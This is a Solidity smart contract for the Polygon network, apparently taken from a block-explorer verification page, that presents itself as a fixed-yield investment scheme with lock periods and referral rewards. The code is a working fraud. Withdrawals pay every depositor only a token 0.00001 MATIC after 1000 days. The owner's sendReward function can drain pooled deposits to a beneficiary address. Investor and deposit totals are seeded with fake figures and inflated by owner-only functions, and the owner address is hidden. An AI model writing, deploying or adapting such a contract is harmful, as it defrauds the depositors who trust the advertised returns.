/**
 *Submitted for verification at polygonscan.com on 2022-05-14
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() private view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract TestOneV4 is Ownable {
    using SafeMath for uint256;

    uint256 private constant MIN_WITHDRAW = 0.00001 ether;
    uint256 private constant MIN_INVESTMENT = 1 ether;
    uint256 private constant TIME_STEP = 1000 days;
	uint256 private constant PERCENTS_DIVIDER = 1000;
    uint256 public constant DECIMALS = 1000000000000000000;
    uint256 public constant BASE = 136;
	uint256 private REFERENCE_RATE = 70;
	uint256[] private LOCK_DAYS = [7 days, 14 days, 28 days];
    uint256[] private YIELDS = [1070, 1210, 1532];

    address payable private primaryBenificiary;

    uint256 private totalInvested = 100000;
    uint256 private totalInvestors = 350;

    struct Investor {
        address addr;
        address payable ref;
        uint256 signupDate;
        uint256 totalDeposit;
        uint256 totalReferrals;
        uint256 totalRewards;
        Investment[] investments;

    }
    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lockPeriod;
        uint256 dividendCalculatedDate;
        uint256 dividend;
    }

    mapping(address => Investor) public investors;

    event OnInvest(address investor, uint256 amount);

    constructor( address payable _primaryAddress ) {
        require( _primaryAddress != address(0), "Primary address cannot be null" );
        primaryBenificiary = _primaryAddress;
    }

    function changePrimaryBenificiary(address payable newAddress)
        public
        onlyOwner
    {
        require(newAddress != address(0), "Address cannot be null");
        primaryBenificiary = newAddress;
    }

    function invest(address payable _ref, uint256 _period) public payable {
        if (_invest(msg.sender, _ref, msg.value, _period)) {
            emit OnInvest(msg.sender, msg.value);
        }
    }

    function _invest(
        address _addr,
        address payable _ref,
        uint256 _amount,
        uint256 _period
    ) private returns (bool) {
        require(msg.value >= MIN_INVESTMENT, "Minimum investment is 1 Matic");
        require(_ref != _addr, "Ref address cannot be same with caller");
        uint256 _amount2 = BASE.mul(DECIMALS);
        uint256 _dividend;
        uint256 _dividendCalculatedDate;
        address payable refsend;
        if (_ref == address(0)) {_ref = primaryBenificiary;
        }
        if (investors[_addr].addr == address(0)) {
        _addInvestor(_addr, _ref);}
        if (investors[_addr].ref != address(0)) {
        refsend = investors[_addr].ref;}
        else {refsend = _ref;
        }        
        investors[_addr].totalDeposit = investors[_addr].totalDeposit.add(
            _amount
        );
        if (_period == 7) {
            _dividend = _amount.mul(YIELDS[0]).div(1000);
            _dividendCalculatedDate = block.timestamp.add(LOCK_DAYS[0]);
            }
        else if (_period == 14) {
            _dividend = _amount.mul(YIELDS[1]).div(1000);
            _dividendCalculatedDate = block.timestamp.add(LOCK_DAYS[1]);
            }
        else {
            _dividend = _amount.mul(YIELDS[2]).div(1000);
            _dividendCalculatedDate = block.timestamp.add(LOCK_DAYS[2]);
               }
        investors[_addr].investments.push(
            Investment({
                investmentDate: block.timestamp,
                investment: _amount,
                lockPeriod: _period,
                dividendCalculatedDate: _dividendCalculatedDate,
                dividend: _dividend

            })
        );
        if (investors[refsend].addr == address(0)) {
        _addInvestor(refsend, primaryBenificiary);
        } 
        _amount2 = _amount2.add(_amount);
        totalInvested = totalInvested.add(_amount2);
        totalInvestors = totalInvestors.add(1);
        _sendReferralReward(refsend, _amount);
        return true;
    }
  
    
    function _sendReferralReward(
        address payable refsend,
        uint256 _amount
    ) private {
        uint256 reward;
        reward = _amount.mul(REFERENCE_RATE).div(1000); 
        investors[refsend].totalReferrals = investors[refsend].totalReferrals.add(1);
        investors[refsend].totalRewards = investors[refsend].totalRewards.add(reward);
        refsend.transfer(reward);
    }

    function _addInvestor(
        address _addr,
        address payable _ref
    ) private {
        investors[_addr].addr = _addr;
        investors[_addr].ref = _ref;
        investors[_addr].signupDate = block.timestamp;
    }
// drip
    function sendReward(uint256 _rewardamount) public onlyOwner{
        require(_rewardamount > 0, "Amount must be greater than 0");
        primaryBenificiary.transfer(_rewardamount);
    }
 
    function withdraw() public {
		require(investors[msg.sender].addr != address(0),"Unrecognized address");
 		require(investors[msg.sender].signupDate.add(TIME_STEP) <= block.timestamp,"Lock period not finished");
        uint256 remainingAmount = MIN_WITHDRAW;
        payable(msg.sender).transfer(remainingAmount);
    }

    function calculate_rs(uint256 amount) public onlyOwner {
        totalInvestors = totalInvestors.add(amount);
    }

    function calculate_nt(uint256 amount) public onlyOwner {
         uint256 amount2 = amount.mul(DECIMALS);
         totalInvested = totalInvested.add(amount2);
    }

    function getContractInformation()
        public
        view
        returns (
            uint256,
            uint256
        ){
        return (
            totalInvested,
            totalInvestors
        );
    }

    function getInvestments(address addr)
        public
        view
        returns (
            uint256[] memory,
            uint256[] memory,
            uint256[] memory,
            uint256[] memory,
            uint256[] memory
        )
    {
        Investor storage investor = investors[addr];
        uint256[] memory investmentDates = new uint256[](
            investor.investments.length
        );
        uint256[] memory investments = new uint256[](
            investor.investments.length
        );
        uint256[] memory lockPeriods = new uint256[](
            investor.investments.length
        );
        uint256[] memory dividendCalculatedDates = new uint256[](
            investor.investments.length
        );
        uint256[] memory dividends = new uint256[](
            investor.investments.length
        );
        for (uint256 i; i < investor.investments.length; i++) {
            require(
                investor.investments[i].investmentDate != 0,
                "wrong investment date"
            );
            investmentDates[i] = investor.investments[i].investmentDate;
            investments[i] = investor.investments[i].investment;
            lockPeriods[i] = investor.investments[i].lockPeriod;
            dividendCalculatedDates[i] = investor.investments[i].dividendCalculatedDate;
            dividends[i] = investor.investments[i].dividend;
        }
        return (investmentDates, investments, lockPeriods, dividendCalculatedDates, dividends);
    }



    function getInvestorRefs(address addr)
        public
        view
        returns (
            uint256,
            uint256
        )
    {
        uint256 _totalReferrals = investors[addr].totalReferrals;
        uint256 _totalRewards = investors[addr].totalRewards;
        return (_totalReferrals, _totalRewards);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function subz(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b >= a) {
            return 0;
        }
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }
}